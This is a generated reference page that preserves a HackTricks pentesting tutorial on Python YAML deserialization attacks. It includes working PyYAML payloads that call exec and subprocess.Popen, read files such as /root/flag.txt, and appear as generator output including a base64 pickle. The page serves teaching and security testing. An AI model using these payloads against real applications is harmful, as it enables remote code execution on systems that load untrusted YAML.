---
parsed_by: focuslocust
source: hacktricks
type: generated
---
# Python Yaml Deserialization

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `hacktricks` |
| Type | `hacktricks-topic` |
| Record ID | `hacktricks-pentesting-web-deserialization-python-yaml-deserialization` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/hacktricks/src/pentesting-web/deserialization/python-yaml-deserialization.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Python Yaml Deserialization](../../topics/pentesting-web/python-yaml-deserialization.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | hacktricks-pentesting-web-deserialization-python-yaml-deserialization |
| name | Python Yaml Deserialization |
| type | hacktricks-topic |
| source | hacktricks |
| url | https://github.com/HackTricks-wiki/hacktricks/blob/master/src/pentesting-web/deserialization/python-yaml-deserialization.md |

## Preserved Source Material

````yaml
_body: "# Python Yaml Deserialization\n\n{{#include ../../banners/hacktricks-training.md}}\n\n## Yaml **Deserialization**\n\
  \n**Yaml** python libraries is also capable to **serialize python objects** and not just raw data:\n\n```\nprint(yaml.dump(str(\"\
  lol\")))\nlol\n...\n\nprint(yaml.dump(tuple(\"lol\")))\n!!python/tuple\n- l\n- o\n- l\n\nprint(yaml.dump(range(1,10)))\n\
  !!python/object/apply:builtins.range\n- 1\n- 10\n- 1\n```\n\nCheck how the **tuple** isn’t a raw type of data and therefore\
  \ it was **serialized**. And the same happened with the **range** (taken from the builtins).\n\n![](<../../images/image\
  \ (1040).png>)\n\n**safe_load()** or **safe_load_all()** uses SafeLoader and **don’t support class object deserialization**.\
  \ Class object deserialization example:\n\n```python\nimport yaml\nfrom yaml import UnsafeLoader, FullLoader, Loader\ndata\
  \ = b'!!python/object/apply:builtins.range [1, 10, 1]'\n\nprint(yaml.load(data, Loader=UnsafeLoader)) #range(1, 10)\nprint(yaml.load(data,\
  \ Loader=Loader)) #range(1, 10)\nprint(yaml.load_all(data)) #<generator object load_all at 0x7fc4c6d8f040>\nprint(yaml.load_all(data,\
  \ Loader=Loader)) #<generator object load_all at 0x7fc4c6d8f040>\nprint(yaml.load_all(data, Loader=UnsafeLoader)) #<generator\
  \ object load_all at 0x7fc4c6d8f040>\nprint(yaml.load_all(data, Loader=FullLoader)) #<generator object load_all at 0x7fc4c6d8f040>\n\
  print(yaml.unsafe_load(data)) #range(1, 10)\nprint(yaml.full_load_all(data)) #<generator object load_all at 0x7fc4c6d8f040>\n\
  print(yaml.unsafe_load_all(data)) #<generator object load_all at 0x7fc4c6d8f040>\n\n#The other ways to load data will through\
  \ an error as they won't even attempt to\n#deserialize the python object\n```\n\nThe previous code used **unsafe_load**\
  \ to load the serialized python class. This is because in **version >= 5.1**, it doesn’t allow to **deserialize any serialized\
  \ python class or class attribute**, with Loader not specified in load() or Loader=SafeLoader.\n\n### Basic Exploit\n\n\
  Example on how to **execute a sleep**:\n\n```python\nimport yaml\nfrom yaml import UnsafeLoader, FullLoader, Loader\ndata\
  \ = b'!!python/object/apply:time.sleep [2]'\nprint(yaml.load(data, Loader=UnsafeLoader)) #Executed\nprint(yaml.load(data,\
  \ Loader=Loader)) #Executed\nprint(yaml.load_all(data))\nprint(yaml.load_all(data, Loader=Loader))\nprint(yaml.load_all(data,\
  \ Loader=UnsafeLoader))\nprint(yaml.load_all(data, Loader=FullLoader))\nprint(yaml.unsafe_load(data)) #Executed\nprint(yaml.full_load_all(data))\n\
  print(yaml.unsafe_load_all(data))\n```\n\n### Vulnerable .load(\"\\<content>\") without Loader\n\n**Old versions** of pyyaml\
  \ were vulnerable to deserialisations attacks if you **didn't specify the Loader** when loading something: `yaml.load(data)`\n\
  \nYou can find the [**description of the vulnerability here**](https://hackmd.io/@defund/HJZajCVlP)**.** The proposed **exploit**\
  \ in that page is:\n\n```yaml\n!!python/object/new:str\nstate: !!python/tuple\n  - 'print(getattr(open(\"flag\\x2etxt\"\
  ), \"read\")())'\n  - !!python/object/new:Warning\n    state:\n      update: !!python/name:exec\n```\n\nOr you could also\
  \ use this **one-liner provided by @ishaack**:\n\n```yaml\n!!python/object/new:str {\n  state:\n    !!python/tuple [\n \
  \     'print(exec(\"print(o\"+\"pen(\\\"flag.txt\\\",\\\"r\\\").read())\"))',\n      !!python/object/new:Warning { state:\
  \ { update: !!python/name:exec  } },\n    ],\n}\n```\n\nNote that in **recent versions** you cannot **no longer call `.load()`**\
  \ **without a `Loader`** and the **`FullLoader`** is **no longer vulnerable** to this attack.\n\n## RCE\n\nCustom payloads\
  \ can be created using Python YAML modules such as **PyYAML** or **ruamel.yaml**. These payloads can exploit vulnerabilities\
  \ in systems that deserialize untrusted input without proper sanitization.\n\n```python\nimport yaml\nfrom yaml import UnsafeLoader,\
  \ FullLoader, Loader\nimport subprocess\n\nclass Payload(object):\n    def __reduce__(self):\n        return (subprocess.Popen,('ls',))\n\
  \ndeserialized_data = yaml.dump(Payload()) # serializing data\nprint(deserialized_data)\n\n#!!python/object/apply:subprocess.Popen\n\
  #- ls\n\nprint(yaml.load(deserialized_data, Loader=UnsafeLoader))\nprint(yaml.load(deserialized_data, Loader=Loader))\n\
  print(yaml.unsafe_load(deserialized_data))\n```\n\n### Tool to create Payloads\n\nThe tool [https://github.com/j0lt-github/python-deserialization-attack-payload-generator](https://github.com/j0lt-github/python-deserialization-attack-payload-generator)\
  \ can be used to generate python deserialization payloads to abuse **Pickle, PyYAML, jsonpickle and ruamel.yaml:**\n\n```bash\n\
  python3 peas.py\nEnter RCE command :cat /root/flag.txt\nEnter operating system of target [linux/windows] . Default is linux\
  \ :linux\nWant to base64 encode payload ? [N/y] :\nEnter File location and name to save :/tmp/example\nSelect Module (Pickle,\
  \ PyYAML, jsonpickle, ruamel.yaml, All) :All\nDone Saving file !!!!\n\ncat /tmp/example_jspick\n{\"py/reduce\": [{\"py/type\"\
  : \"subprocess.Popen\"}, {\"py/tuple\": [{\"py/tuple\": [\"cat\", \"/root/flag.txt\"]}]}]}\n\ncat /tmp/example_pick | base64\
  \ -w0\ngASVNQAAAAAAAACMCnN1YnByb2Nlc3OUjAVQb3BlbpSTlIwDY2F0lIwOL3Jvb3QvZmxhZy50eHSUhpSFlFKULg==\n\ncat /tmp/example_yaml\n\
  !!python/object/apply:subprocess.Popen\n- !!python/tuple\n  - cat\n    - /root/flag.txt\n```\n\n### References\n\n- [https://www.exploit-db.com/docs/english/47655-yaml-deserialization-attack-in-python.pdf](https://www.exploit-db.com/docs/english/47655-yaml-deserialization-attack-in-python.pdf)\n\
  - [https://net-square.com/yaml-deserialization-attack-in-python.html](https://net-square.com/yaml-deserialization-attack-in-python.html)\n\
  \n{{#include ../../banners/hacktricks-training.md}}"
_relative_path: pentesting-web/deserialization/python-yaml-deserialization.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/hacktricks/src/pentesting-web/deserialization/python-yaml-deserialization.md
````
